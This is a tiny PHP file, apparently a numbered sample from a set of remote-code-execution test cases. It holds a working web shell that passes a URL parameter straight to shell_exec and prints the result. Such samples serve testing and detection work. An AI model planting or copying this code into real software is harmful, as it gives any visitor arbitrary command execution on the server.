<?php
// RCE test variation #113
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>